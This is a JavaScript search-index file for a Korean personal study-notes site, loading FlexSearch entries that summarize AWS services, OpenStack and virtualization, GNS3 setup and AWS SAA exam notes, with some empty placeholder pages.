'use strict';(function(){const indexCfg={cache:true};indexCfg.doc={id:'id',field:['title','content'],store:['title','href'],};const index=FlexSearch.create('balance',indexCfg);window.bookSearchIndex=index;index.add({'id':0,'href':'/docs/cloudcomputing/amazonwebservice/','title':"Amazon Web Service",'content':"Amazon Web Service AWS와 CloudComputing  Amazon Web Services ( AWS )  AWS Cloud Computing 와 AWS   Cloud Computing의 종류  IaaS PaaS SaaS   On Premise 서버와 Cloud 서버의 차이  소유자 ( Owner ) 용량 ( Capacity )   렌탈 서버 ( 공유 서버 )와 Public의 차이  렌탈 서버 전용 서버와 가상 전용 서버 렌탈 서버와 AWS ( Public )의 차이   Private Cloud와 Public Cloud  AWS에서의 Private Cloud의 정의 AWS 서비스의 구성    AWS Computing  EC2  EC2 상태의 종류 EC2 구매옵션   Lightsail  Lightsail의 유료 Plan Lightsail\u0026amp; EC2   ECS  Linux Container Kernel Docker   Lambda  Lambda EC2 vs Lambda   Batch  amazonwebservice Batch의 구성요소 Batch Group   Elastic Beanstalk  Elastic Beanstalk의 장점     AWS Database  Amazon RDS ( Relational Database Service )  DB Instance DB Instance Storage Multi-AZ Read Replica Automated Backup Enhanced Monitoring RDS vs DB in EC2   Amazon DynamoDB  DynamoDB의 특징   Amazon ElastiCache  Cache In Memory Cache ( In Memory DataBase ) Memcache ElastiCache   Amazon Redshift  Redshift Redshift의 구성 Data Warehouse(DW) ETL(Extract, Tranform, Load) BI(Business Intelligence) Redshift vs RDS   Amazon Aurora   AWS Storage  S3 ( Simple Storage Service )  버킷( Bucket )의 정의와 특징 객체( Object ) 의 정의와 특징 객체의 스토리지 클래스 S3 사용 윈도우 예약 작업과 S3 활용   Amazon EFS ( Elastic File System )   스토리지 클래스 가용성 성능 모드/ 처리량 모드 수명 주기 관리 파일시스템 정책   Amazon Glacier  Glacier의 종류   Storage Gateway  File Gateway Volume Gateway Tape Gateway   EBS ( Elastic Block Stroe )  EBS의 볼륨 유형     AWS Network  Amazon VPC ( Virtual Private Cloud )  Region Availability zone VPC Peering VPC Endpoint Subnet   VPN ( Virtual Private Network )  Direct Connect   Amazon CloudFront AWS Direct Connect  Direct Connect의 이점   AWS Route 53  Route 53의 라우팅 정책     AWS Migrate  AWS Application Discovery Service  AWS Application Discovery Service의 이점   AWS DMS ( Database Migration Service )  AWS SMS의 이점   AWS Snowball Edge  Snowball 이외에 기능이 추가된 Snowball Edge가 사용하는 경우 AWS Snoball의 이점     AWS Developer  AWS CodeBuild AWS CodeCommit AWS CodeDeploy  CodeDeploy 구성요소   AWS CodePipeling AWS X-Ray   AWS Management  Amazon CloudWatch  Cloudwatch Agent Cloudwatch Logs Cloudwatch Events   AWS CloudFormation  Stack Template Template의 여러 요소   AWS CloudTrail  관리 이벤트 데이터 이벤트 Insights events CloudTrail 이벤트 기록 추적 조직 추적   AWS Config AWS OpsWorks AWS Managed Services AWS Service Catalog  AWS Service Catalog의 핵심개념   AWS TrustedAdvisor  AWS TrustedAdvisro의 분석 카테고리     AWS Security  Amazon Inspector AWS Artfact AWS CertificateManager  SSL/ TLS, HTTPS   AWS CloudHSM AWS DirectoryService AWS IAM  정책 ( Policy ) 역할 ( Role ) 그룹\u0026amp; 사용자 특징   Amazon Cognito AWS KMS ( Key Management Service ) AWS Organizations AWS Shield  Shield의 종류   AWS WAF ( Web Application Firewall )   AWS Analysis  Amazon Athena     Amazon CloudSearch     Amazon EMR     Amazon ES     Amazon Kinesis     Amazon QuickSight     AWS DataPipeline      "});index.add({'id':1,'href':'/docs/cloudcomputing/awssaa/saa-10/','title':"S a a 10",'content':"****  ****       ~\n    "});index.add({'id':2,'href':'/docs/cloudcomputing/awssaa/saa-11/','title':"S a a 11",'content':"****  ****       ~\n    "});index.add({'id':3,'href':'/docs/cloudcomputing/awssaa/saa-12/','title':"S a a 12",'content':"****  ****       ~\n    "});index.add({'id':4,'href':'/docs/cloudcomputing/awssaa/saa-13/','title':"S a a 13",'content':"****  ****       ~\n    "});index.add({'id':5,'href':'/docs/cloudcomputing/awssaa/saa-15/','title':"S a a 15",'content':"****  ****       ~\n    "});index.add({'id':6,'href':'/docs/cloudcomputing/awssaa/saa-16/','title':"S a a 16",'content':"****  ****       ~\n    "});index.add({'id':7,'href':'/docs/cloudcomputing/awssaa/saa-17/','title':"S a a 17",'content':"****  ****       ~\n    "});index.add({'id':8,'href':'/docs/cloudcomputing/awssaa/saa-18/','title':"S a a 18",'content':"****  ****       ~\n    "});index.add({'id':9,'href':'/docs/cloudcomputing/awssaa/saa-5/','title':"S a a 5",'content':"****  ****       ~\n    "});index.add({'id':10,'href':'/docs/cloudcomputing/awssaa/saa-6/','title':"S a a 6",'content':"****  ****       ~\n    "});index.add({'id':11,'href':'/docs/cloudcomputing/awssaa/saa-7/','title':"S a a 7",'content':"****  ****       ~\n    "});index.add({'id':12,'href':'/docs/cloudcomputing/awssaa/saa-8/','title':"S a a 8",'content':"****  ****       ~\n    "});index.add({'id':13,'href':'/docs/cloudcomputing/awssaa/saa-9/','title':"S a a 9",'content':"****  ****       ~\n    "});index.add({'id':14,'href':'/docs/cloudcomputing/openstack/openstack/','title':"Openstack",'content':"인프라 환경 변화의 시작, 클라우드   클라우드 컴퓨팅의 정의와 종류  클라우드 컴퓨팅(Cloud Computing)   인터넷이 가능한 디바이스(스마트폰, 스마트패드, 스마트TV 등)로 클라우드에서 데이터를 처리하며, 저장 및 관리하는 컴퓨팅 시스템\n  클라우드 서비스의 종류\n  IaaS(Infrastrcture as a Service): 서버, 스토리지, 네트워크를 가상화 환경으로 만 들어 필요에 따라 인프라 자원을 제공하는 서비스\n  PaaS(Platform as a Service): 웹에서 개발 플랫폼을 제공하는 서비스\n  SaaS(Software as a Service): 온디맨드 소프트웨어(On-demand Software)라고도 하며, 중앙에서 호스팅 되는 소프트웨어를 웹 브라우저 등 클라우이언트로 이용하는 서비스\n  Daas(Desktop as a Service): 클라우드 인프라를 이용해 os가 설치된 인스턴스를 제공하는 서비스\n  BaaS(Backend as a Service): 모바일 환경에 맞춰 구현하기 힘든 백엔드 부분을 제공하는 서비스\n  Public Cloud: 언제든지 접근이 가능한 클라우드 서비스\n  Private Cloud: 외부에서는 접근이 불가능한 사내 클라우드 서비스\n  Hybrid Cloud Management System: 퍼블릭 클라우드와, 프라이빗 클라우드를 혼용하는 클라우드 서비스\n   클라우드 핵심 서비스 컴퓨트와 스토리지   컴퓨트 서비스(Compute Service)\n 사용자가 원하는 운영체제가 탑재된 컴퓨터나 서버를 인터넷에서 사용할 수 있게 제공하는 서비스    스토리지 서비스(Storage Service)\n 사용자가 소유한 데이터나 음악, 동영상, 문서 파일을 인터넷에 있는 스토리지에 저장, 삭제 공유할 수 있는 서비스      하이퍼바이저의 정의와 종류   하이퍼바이저의 정의    하이퍼바이저(Hypervisor)\n 가상 머신 모니터라고도 하며, 호스트 컴퓨터 한 대에서 운영체제 다수를 동시에 실행하는 논리적 플랫폼을 의미    하이퍼바이저의 분류\n Native, 베어메탈 방식: 하드웨어에 직접 설치해서 실행되는 방식 Hosted 방식: 애플리케이션처럼 프로그램으로 설치되는 방식    가상화 방식에 따른 하이퍼바이저의 분류\n  전가상화 방식(Full Virtualization): 하드웨어를 모두 가상화하는 방식으로, 게스트 운영체제를 변경하지 않고, 다양한 운영체제로 이용할 수 있음. Native 방식이 이에 해당\n  반가상화 방식(Para Virtualization): 하이퍼바이저로만 제어가 가능한 방식으로, 높은 성능의 유지가 가능하지만, 오픈 소스가 아니면 운영이 불가능\n      하이퍼바이저의 종류   KVM(for Kerne-based VirtualMachine):\n 오픈스택의 거본 하이퍼바이저로 전가상화 방식을 지원 반드시 Inter VT나 AMD-V가 있어야만 사용이 가능 리눅스, 윈도 이미지를 수정하지 않고 여러 가상 머신으로 실행이 가능    Xen과 Xen Server:\n Center를 이용한 관리 기능, 스토리지 지원과 실시간 마이그레이션, 고가용성 기능처럼 데이터센터에서 요구하는 확장 기능을 제공    Hyper-V:\n 디바이스 드라이버가 부모 파티션 위에서 동작하며, 콘솔 OS의 역할을 부모 파티션이 수행 다른 하이퍼바이저의 비해 크기가 작아 오류 코드가 포함될 확류이 낮음 Inter VT, AMD-V x64를 지원하는 하드웨어가 있어야 가상화가 가능    VMware vSphere ESX:\n 적은 하드웨어서도 애플리케이션을 통합할 수 있도록 서버를 가상화해주는 무료 베어메탈 하이퍼바이저 ESX는 가상 머신의 업무를 지원하는 역할을 수행, 가상 머신이 발생시킨 명령어를 하이퍼바이저가 받아 재작업 후, 가상 환경에서 잘 구동하도록 바이너리 변환 방식을 사용 Inter, VT, AMD-V 같은 가상화를 지원하는 디바이스가 없어도 가상화를 구현할 수 있음    Docker:\n 리눅스 기반의 컨테이너 런타임 오픈 소스로, 가상 머신과 기능이 유사하며, 가상 머신보다 훨씬 가벼운 형태로 배포가 가능 컨테이너의 개념으로 가상 머신처럼 Docker Engine을 호스트 웨어서 수행하며, 리눅스 기반의 운영체제만 수행이 가능 가상 머신처럼 하드웨어를 가상화하는 것이 아니라, 게스트 OS를 분리시켜 제공 호스트 운영체제의 프로세스 공간을 공유한다고 할 수 있음    VirtualBox:\n 리눅스, OS X, 솔라리스, 윈도를 게스트 운영체제로 가상화하는 x86 가상화 소프트웨어 다른 하이퍼바이저와 비교했을 때는 기능이 부족 원격 데스크톱 프로토콜(RDP), iSCSI 지원, RDP를 거치는 원격 디바이스의 USB 지원처럼 원격 가상 컴퓨터를 제어할 수 있는 기능이 있음 Inter VT와 AMD-V를 지원    VMware Workstation:\n 게스트 운영체제에 설치할 수 있는 다리이버 및 기타 소프트웨어의 묶음 게스트 머신이 고해상도 화면에 접근할 수 있게 하는 VESA호한 그래픽, 네트워크 인터페이스 카드용 네트워크 드라이버, 호스트와 게스트 간 클립보드 공유, 시간 동기화 기능 등을 제공    Parallels Desktop:\n 맥용 인텔 프로세서가 있는 매킨토시 컴퓨터에 하드웨어 가상화를 제공하려고 만든 소프트웨어 MS-DOS, 윈도, 맥, 리눅스, 솔라시스 등 다양한 운영체제를 가상화 할 수 있음      하이퍼바이저별 이미지 포맷  KVM: img, qcow2, vmdk VMWARE: vmdk 오라클 VirtualBOx: vdi, vmdk, qcow2, vhd 마이크로소프트 Hyper-V: vhd, vmdk, vdi Xen, Xen Server: qcow2, vhd    이미지포맷 설명  qcow2: QEMU Copy On Write 2 vdi: Virtual Disk Image vmdk: VMware Virtual Disk DevelopmentKit vhd: Virtual Hard Disk    클라우드에서 알아야 할 네트워크 상식     고정 IP, 유동 IP\n 고정IP (Fixed IP): 인터넷 공유기를 연결해 고정으로 할당받는 IP 유동IP (Floating IP): 가상 인스턴스가 외부에서 접근할 수 있도록 할당하는 인터넷이 가능한 IP    클래스의 범위\n A 클래스: 1 ~ 126 B 클래스: 128 ~ 191 C 클래스: 192 ~ 223 D 클래스: 224 ~ 239 E 클래스: 240 ~ 254 멀티캐스트는 D 클래스, E 연구 개발 목적으로 예약된 클래스      CIDR(Classless Inter-Domain Routing)  클래스가 없는 도메인간 라우팅 기법으로 기존 IP할당 방식인 네트워크 클래스를 대체 급격히 부족해지는 IPv4 주소를 좀 더 효율적으로 사용 접두어를 이용한 주소 지정 방식의 계층적 구조를 사용해 인터넷 라우팅의 부담을 덜어 줌    SDN(Software Defined Networking)  네트워크 제어 기능이 물리적 네트워크와 분리되도록 프로그래밍한 네트워크 구조를 뜻함 네트워크 제어 기능을 데이터 전달 기능과 분리해서 구현해야 한다. 네트워크 제어 기능이 개발되고 실행될 수 있는 환경을 분리해 낮은 성능의CPU가 있는 하드위어 위에 스위치에 더 이상 위치시키지 않는다.    오픈플로(OpenFlow)  SDN의 근간이 되는 기술로 SDN 아키텍처의 컨트롤 레이어와 인프라스트럭처 레이어 사이에 정의된 최초의 표준 통신 인터페이스 흐름정보로 패킷의 전달 경로와 방식을 제어 오픈플로는 오픈플로 컨트롤러와 오픈플로로 지원 네트워크 장비(라우터, 스위치) 사이에서 커뮤니케이션 역할을 담당 일반적인 네트워크 장비(라우터, 스위치)는 플로 테이블을 이용해서 네트워크 트래픽을 처리하는 반면, 오픈플로는 소프트웨어 컨트롤러로 플로테이블을 조작하고 데이터 경로를 설정    네트워크 장비    라우터(Router):\n 인터넷 등 서로 다른 네트워크를 연결할 때 사용하는 장비 데이터 패킷이 목적지까지 갈 수 있는 경로를 검사하여 최적의 경로를 탐색하는 것을 라우팅이라 함 경로가 결정되면 결정된 길로 데이터 패킷하는 것을 스위칭이라고 함    허브(Hub):\n 인터넷이 등장하기 이전, 컴퓨터와 컴퓨터를 연결해 네트워크를 구성하는 장비 멀티포트(Multiport) 또는 리피터(Repeater)라고도 할 수 있습니다.    CSMA/CD(Carrier Sense Multiple Access/Collision Detect):\n 이더넷 전송 프로토콜로 IEEE 802.3 표준에 규격화되어 있습니다.    브리지(Bridge):\n 콜리전(충돌) 도메인을 나누어 서로 통신이 가능하도록 다리처럼 연결해 주는 네트워크 장비 분리된 콜리전 도메인을 세그먼트라고 한다.    스위치(Switch)\n 브리지와 역할이 동일하지만, 소프트웨어적으로 처리하는 스위치가 소프트웨어적으로 처리하는 브리지보다 속도가 더 빠르다. 스위치가 브리지 보다 많은 포트 개수를 제공(20~ 100) 브리지는 Store-and-forward라는 프레임 처리 방식만 지원하지만, 스위치는 Cut-through, Store-and-forward라는 프레임 처리 방식을 지원    스위치 관련 용어\n 프레임: 데이터를 주고받을 때 데이터를 적절한 크기로 묶어 놓은 것 프레임 처리 방식: 입력되는 프레임을 스위칭하는 방식입니다. Store-and-forward: 들어오는 프레임 전부를 일단 버퍼에 담아 두고, CRC 등 오류 검출을 완전히 처리한 후 전달(포워딩)하는 스위칭 기법 Cut-through: 스위칭 시스템에서 수신된 패킷 부분만 검사해 이를 곧바로 스위칭하는 방식      블록 스토리지와 오브젝트 스토리지    블록 스토리지(Block Storage)와 오브젝트 스토리지(Object Storage)  블록 스토리지: 컴퓨터의 용량을 추가하는 것처럼 클라우드 상의 하드 디스크를 블록 스토리지라고 함 오브젝트 스토리지: 사용자 계정별로 저장 공간을 할당할 수 있는 스토리지 시스템으로 블록 스토리지와는 다르게 단독으로 구성이 가능하며, 계정의 컨테이너 파일이나 데이터를 저장할 수 있는 저장 공간      대표적인 스토리지 서비스    아마존의 EBS와 S3:\n EBS(Elastic Block Store)는 블록 스토리지에 해당하는 서비스 EC2(Elastic Compute Cloud)은 생성한 인스턴스에 확장해서 사용할 수 있는 스토리지 서비스 S3는 오브젝트 스토리지에 해당하는 서비스로 사용자 계정에 해당하는 Owner, 컨테이너에 해당하는 Bucket, 파일이나 해당데이터에 해당하는 오브젝트로 구성되어있다.    오픈스택의 Cinder와 Swift\n Cinder는 오픈스택의 기본 서비스 중 하나로 블록 스토리지 서비스를 제공한다. Cinder는 cinder-volume, cinder-backup, cinder-scheduler, Volume Provider, cinder-api로 구성 Nova에서 제공하는 인스턴스의 확장 스토리지로 사용할 수 있다. Swift는 오픈스택의 기본 서비스 중 하나로 오브젝트 스토리지 서비스를 제공한다. Swift는 proxy-server, account-server, container-server, object-server, swift-api로 구성된다. proxy-server는 여러 대의 스토리지 노드로 구성된 account-server, container-server, object-server을 관리한다.    Ceph의 RBD와 RADOS\n Ceph는 모든 종류의 스토리지 서비스를 모아 놓은 오픈 소스 서비스라고 할 수 있다. RADOS라는 스토리지 노드 위에 LIBRADOS라는 RADOS 라이브러리가 있다. 아마존의 S3, 오픈스택의 Swift와 연동하는 RADOSGW(게이트웨이)가 있다 QEMU나 KVM에서 생성한 인스턴스를 블록 스토리지로 사용하는 RBD(Rados Block Device), 사용자의 편의성을 제공하려고 POSIX(표준 운영체제 인터페이스)를 제공하는 Ceph FS로 구성되어 있다.       OpenStack   오픈스택과 아키텍처  오픈스택   오픈스택은 컴퓨트, 오브젝트 스토리지, 이미지, 인증 서비스 등이 유기적으로 연결되어 하나의 커다한 클라우드 컴퓨팅 시스템을 구축하는 것.\n  개념 아키텍처로 살펴보는 오픈스택의 변화\n   \r 오픈스택의 변화\r...\r\r 백사버전부터는 컴퓨트 서비스에는 Nova 추가 스토리지 서비스에는 Swift 추가 이미지 관리 서비스에는 Glance 추가 Nova, Swift, Glance의 인증을 담당하는 Keystone 추가 서비스를 보다 쉽게 이용하려고 사용자에게 대시보드를 제공하는 Horizon 추가 폴섬 버전부터는 네트워크 서비스와 블록 스로리지 서비스를 Quantum와 Cinder 로 분류함 Quantum은 기존 nova-network와 다르게 OpenFlow를 사용해서 여러 네트워크 컨트롤러의 지원이 가능 하바나버전부터는 오케스트레이션 서비스인 Heat와 텔레미터 서비스인 Ceilometer가 있습니다. 킬로 이후 버전부터는 빅데이터 프로세싱 프레임워크인 Sahara 추가 데이터베이스 서비스인 Trove 추가 PXE나 IPMI를 사용해 베어메탈을 프로비저닝하는 Ironic 추가 코어 서비스 6개와 이를 지원하는 많은 서비스를 표현한 빅텐트(Big-tent)라는 개념 추가 \r\r\r\r  클라우드 서비스(오픈스택을 기준으로)    시스템 관련 클라우드 서비스\n Nova    스토리지 관련 클라우드 서비스\n Swift : 객체 스토리지 Cinder : 블록 스토리지    네트워크 관련 클라우드 서비스\n Neutron    데이터 관련 클라우드 서비스\n Glance Trove    기타 클라우드 서비스\n Horizon Keystone      논리 아키텍처로 살펴보는 오픈스택의 변화   \r 오픈스택의 변화\r...\r\r  상황별 오픈스택 구성 요소\n 사내 클라우드 컴퓨팅 환경을 구축할 때나 퍼블릭 클라우드 서비스를 구성할 때 오픈스택을 주로 채택 회사의 클라우드 환경을 어떤 목적으로 사용하느냐에 따라 선택해야할 서비스가 달라질 수 있음      HTC(High Throughput Computing):  HTC 사용자는 종종 Nova 컴퓨트로 전환해 Horizon 대시보드로 단일 API 엔드포인트를 사용자에게 제공함. Keystone은 일반적으로 사용자 계정이 저장되는 LDAP 백엔드를 연결하는 데 사용 이런 종류의 프로젝트를 구성하려면 다음이 서비스가 필요함  대시보드 서비스 Horizon 텔레미터 서비스 Ceilometer 블록 스토리지 서비스 Cinder 오케스트레이션 서비스 Heat 이미지 서비스 Glance 인증 서비스 keystone 컴퓨트 서비스 Nova        웹 호스팅:  웹 호스팅 회사 중 하나로 수백만 개의 호스팅 사용하는 데 오픈스택을 활용 Nova, Neutron, Keystone, Glance, Horizon 같은 일반적인 코어 서비스를 이용 사용자 계정 데이터를 수집하고 요금을 청구할 때 일부 기술로 Ceilometer를 활용  네트워크 서비스 Neutron 대시보드 서비스 Horizon 텔레미터 서비스 Ceilometer 이미지 서비스 Glance 인증 서비스 keystone 컴퓨트 서비스 Nova        퍼블릭 클라우드:  오픈스택은 전 세계 사용자에에 IaaS를 제공하는 퍼블릭 클라우드를 지원 Nova, Glance, Keystone, Cinder, Neutron 같은 서비스를 제공 Swift를 사용해 오브젝트 스토리지 서비스를 제공, Designate는 DNSaaS(DNS as a Service)를 제공함  네트워크 서비스 Neutron 도메인 네임 서비스 Designate 블록 스토리지 서비스 Cinder 오브젝트 스토리지 서비스 Swift 이미지 서비스 Glance 인증 서비스 Keystone 컴퓨트 서비스 Nova        웹 서비스, 전자상거래:  이베이, 오버스톡닷컴, 베스트바이 등 많은 회사가 오픈스택을 이용해 웹 서비스도 하고 전자상거래의 백엔드로도 사용 상황에 맞춰 오픈스택 클라우드는 PCI 표준처럼 구성하기도 함 Trove는 내부 고객에게 데이터베이스 서비스인 DaaS를 제공, 네트워크 정의 소프트웨어 SDN은 Neutron을 제공  네트워크 서비스 Neutron 대시보드 서비스 Horizon 데이터베이스 서비스 Trove 블록 스토리지 서비스 Cinder 이미지 서비스 Glance 인증 서비스 Keystone 컴퓨트 서비스 Nova        컴퓨트 스타터 키트(Compute Starter Kit):  더 많은 사람이 오픈스택을 사용할 수 있도록 하는 것이 컴퓨터 스타터 키트라고 함 스타터 키트는 추가 기능으로 클라우드 확장할 수 있는 방법을 문서화로 제공하는 단순한 프로젝트를 의미함  네트워크 서비스 Neutron 이미지 서비스 Glance 인증 서비스 Keystone 컴퓨트 서비스 Nova        빅데이터:  다양한 리소스 데이터를 분석하는 빅데이터에도 활동 됨 빅데이터 분석 서비스인 Sahara 프로젝트는 오픈스택 위에 빅데이터 응용프로그램(Hadoop, Spark)을 간단하게 제공할 수 있음  네트워크 서비스 Neutron 대시보드 서비스 Horizon 베이메탈 서비스 Ironic 빅데이터 서비스 Sahara 이미지 서비스 Glance 인증 서비스 Keystone 컴퓨트 서비스 Nova        DBaaS:  대부분의 회사는 응용프로그램을 백업하려 데이터베이스에 크게 의존하며 일반적인 관리 자동화 및 스케일 아웃을 최우선으로 생각 오픈스택 Trove 프로젝트는 이 기능을 제공 및 여러 SQL 및 NoSQL 백엔드를 지원 Ironic 프로젝트는 데이터베이스의 성능을 극대화하려고 베어메탈 프로비저닝을 제공  네트워크 서비스인 Neutron 대시보드 서비스 Horizon 데이터베이스 서비스 Trove 도메인 네임 서비스 Designate 베어메탈 서비스 Ironic 블록 스토리지 서비스 Cinder 오브젝트 스토리지 서비스 Swift 이미지 서비스 Glance 인증 서비스 Keystone 컴퓨트 서비스 Nova        비디오 처리와 콘텐츠 전달:  제작 스튜디오나 주요 케이블 서비스 제공 업체 같은 곳의 비디오 처리(Video Processing), 콘텐츠 전달(Contents Delivery)은 오픈스택의 보편적인 사용 예시임 Keystone에서 선보인 인증 표준은 이제 동일한 대시보드와 인증을 사용해 프라이빗 클라우드 및 퍼블릭 클라우드에서 비디오 콘텐츠를 원할하게 이동시킬 수 있음  네트워크 서비스 Neutron 오브젝트 스토리지 서비스 Swift 인증 서비스 Keystone 컴퓨트 서비스 Nova        컨테이너 서비스:  가상머신, 컨테이너, 베어메탈에서 실행되는 워크로드를 단일 클라우드에서 운영할 수 있도록 개발되었음 Kubernetes, Mesos, Docker 같은 새로운 컨테이너 오케스트레이션 엔징(COE, container Orchestration Engices)와 통합하려고 Magnum 프로젝트에 엑세스 할 수 있음  네트워크 서비스 Neutron 대시보드 서비스 Horizon 베어메탈 서비스 Ironic 블록 스토리지 서비스 Cinder 이미지 서비스 Glance 인증 서비스 Keystone 컨테이너 서비스 Management 컴퓨트 서비스 Nova     \r\r\r\r  오픈스택 적용사례  업종별·목적별 클라우드 활용 사례  웹 사이트에서 클라우드 활용 소셜 게임의 클라우드 활용 애플리케이션 개발/테스트 환경에서의 클라우드 활용 스타트업 기업에서의 클라우드 활용 BCP(비지니스 연속성 계획)의 클라우드 활용 ERP(통합 기간 업무 시스템)에서의 클라우드 활용 제조업의 클라우드 활용 지자체 클라우드 교육 분야의 클라우드 활용 농업 분야의 클라우드 활용 빅 데이터 이용을 위한 클라우드의 활용 IoT에서 클라우드 활용 인공 지능 등의 새로운 산업 영역에서의 클라우드 활용    참고 홈페이지  오픈스택 릴리스 웹 사이트 Nalee의 IT 이야기    오픈스택 파운데이션과 커뮤니티  오픈스택 파운데이션:  나라별로 오픈스택 사용자 그룹을 운영하고 있다. 사용자 그룹은 공식 사용자 그룹과 일반 사용자 그룹으로 나뉨 오픈스택 사용자 그룹은 총 112개, 이중 공시기 사용자 그룹은 18개이며, 엠버서더로 활동하는 구성원은 총 12명, 아시아는 6명이다. 오픈스택은 버전별 컨트리뷰터 활동을 그래프와 표로 보여주는 http://stackalytics.com/을 운영한다.     \r\r"});index.add({'id':15,'href':'/docs/network/%EC%A0%95%EB%A6%AC%EC%A0%84/gns3/','title':"G N S3",'content':"네트워크 실습을 위한 GNS3 설치    GNS3 Download Link      상단의 GNS3 다운로드 링크를 클릭하여 GNS3에 접속 후, 로그인 혹은 회원가입을 진행합니다.      로그인 후, Download를 클릭하여 운영체제에 맞는 GNS3 설치파일을 다운로드 합니다.      기본 값으로 설치를 진행합니다. 단 솔라윈드 톨킷은 설치하지 않습니다.      GNS3의 설치가 완료되었습니다.      GNS3가 설치되면 GNS3를 실행시킵니다. 설정에 맞는 사항을 체크합니다. 여기서는 첫 번째 항목을 체크하겠습니다. 1. Run appliances in a virtual machine  가상 머신을 통하여 최신 IOS를 포함한 IOSv, IOU, ASA와 다른 Vendor의 Appliance들을 작동시킨다. 단 이 첫 번째 세팅은 설명에서 요구하듯이 GNS3 VM을 요구한다.   2. Run appliances on my local computer  로컬 컴퓨터, 즉 가상 머신이나 다른 서버를 통하지 않고 자신의 컴퓨터 내부에서 Appliance들을 작동시킨다.   3. Run appliances on a remote server (advanced usage)  자신의 컴퓨터, 자신의 가상 머신이 아닌 외부 서버의 컴퓨터, 외부 서버의 가상 머신에서 Appliance들을 작동시킨다. \r\r      다음으로는 서버의 경로와 호스트 주소, 포트번호를 설정하는 화면이 나옵니다. 여기서는 기본 값으로 설치를 진행하겠습니다.      다음은 VMware 혹은 VirtBOX를 GNS3의 연동합니다. 에러가 따는 경우 VIX를 설치 후 진행합니다.                          "});index.add({'id':16,'href':'/docs/network/%EC%A0%95%EB%A6%AC%EC%A0%84/nas/','title':"Nas",'content':"네트워크 실습을 위한 GNS3 설치    GNS3 Download Link      상단의 GNS3 다운로드 링크를 클릭하여 GNS3에 접속 후, 로그인 혹은 회원가입을 진행합니다.      로그인 후, Download를 클릭하여 운영체제에 맞는 GNS3 설치파일을 다운로드 합니다.      기본 값으로 설치를 진행합니다. 단 솔라윈드 톨킷은 설치하지 않습니다.      GNS3의 설치가 완료되었습니다.      GNS3가 설치되면 GNS3를 실행시킵니다. 설정에 맞는 사항을 체크합니다. 여기서는 첫 번째 항목을 체크하겠습니다. 1. Run appliances in a virtual machine  가상 머신을 통하여 최신 IOS를 포함한 IOSv, IOU, ASA와 다른 Vendor의 Appliance들을 작동시킨다. 단 이 첫 번째 세팅은 설명에서 요구하듯이 GNS3 VM을 요구한다.   2. Run appliances on my local computer  로컬 컴퓨터, 즉 가상 머신이나 다른 서버를 통하지 않고 자신의 컴퓨터 내부에서 Appliance들을 작동시킨다.   3. Run appliances on a remote server (advanced usage)  자신의 컴퓨터, 자신의 가상 머신이 아닌 외부 서버의 컴퓨터, 외부 서버의 가상 머신에서 Appliance들을 작동시킨다. \r\r      다음으로는 서버의 경로와 호스트 주소, 포트번호를 설정하는 화면이 나옵니다. 여기서는 기본 값으로 설치를 진행하겠습니다.      다음은 VMware 혹은 VirtBOX를 GNS3의 연동합니다. 에러가 따는 경우 VIX를 설치 후 진행합니다.                          "});index.add({'id':17,'href':'/docs/programing/shell/shell-2/','title':"Shell 2",'content':"****    ****         #\n"});index.add({'id':18,'href':'/docs/cloudcomputing/awssaa/saa-1/','title':"1장 AWS의 핵심 서비스",'content':"SAA 요약정리  정리를 들어가기 전 핵심요소  자격 시험의 합격과 실패는 현장에서의 실무 경험과 실습 중심의 학습, 시험에 필요한 세부적인 정보와 숫자를 얼마나 잘 기억하는지에 달려 있다. AWS SAA는 핵심 AWS 서비스 구성 요소와 운영은 물론 서비스 간의 상호작용 방식도 이해가 필요 기본적인 공부는 Amazon의 공식문서 및 여러 실습 경험을 필요로 한다.    AWS SAA 참고자료      시험영역 출제 비율     1. 복원력을 갖춘 아키텍처 설계 34%   1-1. 안정적이고, 복원력을 갖춘 스토리지를 선택한다.     1-2. 어떻게 AWS 서비스를 사용해 결합 해제 매커니즘을 설계할지 결정한다.     1-3. 어떻게 멀티 티어 아키텍처 솔루션을 설계할지 결정한다.     1-4. 어떻게 고가용성 및/ 또는 내결함성을 갖춘 아키텍처를 설계할지를 결정한다.           2. 성능이 뛰어난 아키텍처 정의 24%   2-1. 성능이 뛰어난 스토리지 및 데이터베이스르 선택한다.     2-2. 캐싱을 적용해 성능을 개선한다.     2-3. 탄력성과 확장성을 갖춘 솔루션을 설계한다.           3. 안전한 애플리케이션 및 아키텍처 설명 26%   3-1. 어떻게 애플리케이션 티어를 보호할지 결장한다.     3-2. 어떻게 데이터를 보호할지 결정한다.     3-3. 단일 VPC 애플리케이션을 위한 네트워킹 인프라를 정의한다.           4. 비용에 최적화된 아키텍처 설계 10%   4-1. 어떻게 비용에 최적화된 스토리지를 설계할지 결정한다.     4-2. 어떻게 비용에 최적화된 컴퓨팅을 설계할지 결정한다.           5. 운영 면에서 탁월한 아키텍처 정의 6%   5.1 솔루션에서 운영 우수성을 지원할 수 있는 기능을 선택한다.         1장 AWS의 핵심 서비스   1장의 핵심내용  AWS 플랫폼 아키텍처와 그 기반 기술을 이해한다. AWS 관리 도구의 종류화 사용법을 이해한다. 지원 플랜의 종류와, 선택하는 방법을 이해한다.       클라우드 컴퓨팅과 가상화   모든 클라우드 운영 기술의 토대는 가상화라고 할 수 있다. 가상화란 단일 물리 서버를 하드웨어 리소스를 더 작은 단위로 나눌 수 있고, 물리 서버는 가상 머신 여러 개를 호스트할 수 있개 해주는 기술이다. 이러한 가상화의 장점은 가상 서버를 짧은 시간만에 프로비저닝해서 프로젝트에 필요한 시간만 정확하게 실행하고, 언제든지 종료해서 사용하던 리소스를 다른 워크로드에 즉시 활용할 수 있다. 클라우드 환경의 키워드는 확장성과 탄력성     확장성과 탄력성     키워드 설명     확장성 예기치 않은 수요가 발생하더라도 자동적으로 리소스츨 추가해서 효과적으로 대응할 수 있음     AWS 에서는 수요에 능동적으로 대처할 수 있게 설게 된 Auto Scaling 서비스를 사용해서 머신 이미지를 신속히 복제 및사용   탄력성 수요를 관리한다는 목적에서는 학장성과 동일한 못적을 자기고 있지만, 탄력성은 수요가 떨어질 때 용량을 자동으로 줄이는 개념       AWS 서비스의 범주   AWS 서비스의 범주      범주 기능     컴퓨팅 데이터 센터에서 물리 서버가 하는 역할을 복제한 클라우드 서비스     Auto Scaling, 로드 밸런싱, 서버리스 아키텍처에 이르는 고급 기능을 제공   네트워크 애플케이션 연결, 엑세스 제어, 향상된 원격 연결   스토리지 빠른 액세스와 장기적인 백업 요구에 모두 적합하게 설계된 여러 종류의 스토리지 플랫폼   데이터 베이스 관계형, NoSQL, 캐싱 등 데이터 